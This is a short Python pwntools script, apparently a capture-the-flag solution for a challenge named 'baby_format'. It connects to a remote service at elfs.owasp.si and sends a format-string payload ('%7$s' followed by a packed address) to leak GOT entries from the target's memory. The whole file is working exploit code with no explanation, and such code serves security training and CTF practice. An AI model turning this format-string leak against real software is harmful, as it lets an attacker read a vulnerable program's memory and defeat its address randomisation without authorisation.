#!/usr/bin/env python3

from pwn import *
import sys


context.binary = '../baby_format'
context.log_level = 'DEBUG'


def leak_data(address):
    #r = process('./baby_format')
    r.readuntil('name again?')
    print(b"%7$sAAAA" + p64(address))
    r.sendline(b"%7$sAAAA" + p64(address))
    r.readuntil('ah yes ')
    data = r.readuntil('AAAA')[:-4]
    return data


r = remote('elfs.owasp.si', 40005)
#r = process('./baby_format')

def get_got_entry(entry):
    with log.progress('Leaking GOT entry for "{}"'.format(entry)) as p:
       data = leak_data(context.binary.got[entry])
       value = u64(data.ljust(8, b'\x00'))
       p.success(hex(value))
    return value


get_got_entry(sys.argv[1])
